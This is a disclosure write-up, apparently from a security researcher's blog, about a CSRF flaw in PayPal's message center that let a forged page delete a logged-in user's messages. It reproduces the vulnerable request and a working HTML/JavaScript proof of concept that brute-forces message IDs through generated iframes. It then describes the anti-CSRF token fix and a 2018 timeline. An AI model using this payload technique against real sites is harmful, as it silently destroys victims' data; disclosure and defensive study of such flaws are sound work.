---
layout: post
title:  "I could’ve deleted all SMC messages. using Brute Force Technique – PayPal"
---

While playing around with the SMC platform at paypal.com, I came across an interesting endpoint which doesn’t include CSRF token within its request when you delete a message. Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help from social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, in this case, a CSRF attack can force the user to delete all of his messages without the victim’s notice.

### PayPal Message Center [SMC]:

PayPal has created a Message Center for its customers like most financial institutions and eBay provides. The Message Center gives PayPal the ability to communicate with you within the framework of a new mailbox inside your PayPal account. It also provides you with a way to validate customer service emails that you may consider suspicious. This way, you can trust that the communications you receive are from PayPal itself. How does it work?

Emails from PayPal will be put into the Message Center. A notification will be sent to let you know that you have a message.

1. Open https://www.paypal.com/ma/selfhelp/contact/email/t_s
2. At the middle, select which issue/topic do you want to ask about.
3. Click “SEND”, then wait for them to reply with a solution/information

### The Interesting HTTP-Request:

```
GET /smc/delete-msg/?message_id=38223655 HTTP/1.1
Host: www.paypal.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: https://www.paypal.com/smc/customer
Cookie: **********************************************************
Connection: close
```

Apparently, there’s no CSRF token right there but there’s a message_id which definitely could replace the CSRFtoken on its job, due to its difficulty to be guessed.

## The Attack scenario/Proof of Concept:

The only way that could let us find the right message_id is to use a dynamic functionality written by JavaScript to brute force the message_id through the URL.

```
<html>
<body>
<div id="elementID"></div>
<script>
   for (var i=38223650; i<=38223800;i++) {
    var url = "https://www.paypal.com/smc/delete-msg/?message_id=";
      url = url + String(i);
      frame = document.createElement('iframe');
      frame.setAttribute('src', url);
      frame.setAttribute('width', '30px');
      frame.setAttribute('height', '50px');
      (document.getElementById('elementID')).appendChild(frame);
   }
</script>
</body>
</html>
```

Now, we just have to save this file as an HTML file and upload it to our server in order to send it to the victim. When the victim will access this page, it will create a few new iframes with the SRC attribute set to:


```
https://www.paypal.com/smc/delete-msg/?message_id=38223650
https://www.paypal.com/smc/delete-msg/?message_id=38223651
https://www.paypal.com/smc/delete-msg/?message_id=38223652
https://www.paypal.com/smc/delete-msg/?message_id=38223653
https://www.paypal.com/smc/delete-msg/?message_id=38223654
https://www.paypal.com/smc/delete-msg/?message_id=38223655
https://www.paypal.com/smc/delete-msg/?message_id=38223656
```

So, what’s happening here! When it creates an iframe of https://www.paypal.com/smc/delete-msg/?message_id= it’s going to use the number 38223650 as the value of the message_id parameter and submit the URL. Then it’s going to keep increment the value of the message_id by one more digit +1 until it covers all the messages inside the inbox/sent folder. I could also make this script start from 0 to 9999999.. which means there’s a high chance that the script will cover all valid message_id inside the victim’s account.

![](/ayoubmokhtar.github.io/_posts/images/post-1-image001.png?raw=true)

The idea behind creating a new iframe is preferable because it takes less memory to process so chances of a crash are also less. And if it DOES the victim won’t control the browser until the script is done. Otherwise, the IFrames keep processing while the victim is waiting for the browser to be stabilized.


## How it got FIXED:

The PayPal security team resolved this issue using the most popular implementation to prevent the CSRF vulnerability, which is a secret/random token that is associated with a particular user called Anti-CSRF, then include it within every sensitive request that requires a server-side verification before authorizing any sensitive action.

![](/ayoubmokhtar.github.io/_posts/images/post-1-image002.png?raw=true)

### Timeline:

- 15th of January 2018 – Bug reported.
- 24th of January 2018 – First response from PayPal, More Information Required –Researcher.
- 23rd of Mars 2018 – The vulnerability is fixed now.